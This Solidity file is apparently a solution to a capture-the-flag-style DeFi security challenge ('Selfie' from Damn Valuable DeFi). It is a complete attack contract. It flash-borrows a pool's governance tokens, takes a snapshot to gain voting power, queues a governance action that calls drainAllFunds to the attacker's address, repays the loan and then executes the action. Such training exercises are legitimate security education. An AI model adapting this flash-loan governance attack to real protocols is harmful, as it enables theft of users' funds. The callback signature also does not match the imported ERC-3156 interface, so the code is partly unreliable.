// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {ReentrancyGuard} from "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import {ERC20Snapshot} from "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import {Address} from "@openzeppelin/contracts/utils/Address.sol";
import {SimpleGovernance} from "./SimpleGovernance.sol";
import {DamnValuableTokenSnapshot} from "../DamnValuableTokenSnapshot.sol";
import {SelfiePool} from "./SelfiePool.sol";
import "forge-std/Test.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract SimpleGovernanceAttack is Test {
    using Address for address;

    DamnValuableTokenSnapshot public governanceToken;
    SimpleGovernance public governance;
    SelfiePool public selfiePool;
    address public attacker;
    uint256 private actionId;

    constructor(address _governance, address _selfiePool) {
        governance = SimpleGovernance(_governance);
        selfiePool = SelfiePool(_selfiePool);
        governanceToken = DamnValuableTokenSnapshot(governance.getGovernanceToken());
        attacker = msg.sender;
    }

    function attack() public {
        selfiePool.flashLoan({
            _receiver: IERC3156FlashBorrower(address(this)),
            _token: address(governanceToken),
            _amount: governanceToken.balanceOf(address(selfiePool)),
            _data: abi.encodeWithSignature("receiveTokens(address,uint256)", address(governanceToken), governanceToken.balanceOf(address(selfiePool)))
        });
    }

    function receiveTokens(address _token, uint256 _amount) public {
        // 2. Create token snapshot
        governanceToken.snapshot();
        // 3. Queue a governance action to drain all DVT from selfiePool
        actionId = governance.queueAction({
            target: address(selfiePool),
            value: 0,
            data: abi.encodeWithSignature("drainAllFunds(address)", address(attacker))
        });
        // 4. Return the flash loan
        DamnValuableTokenSnapshot(_token).transfer(address(selfiePool), _amount);
    }

    function attack2() public {
        // 5. Execute the governance action
        governance.executeAction(actionId);
    }
}
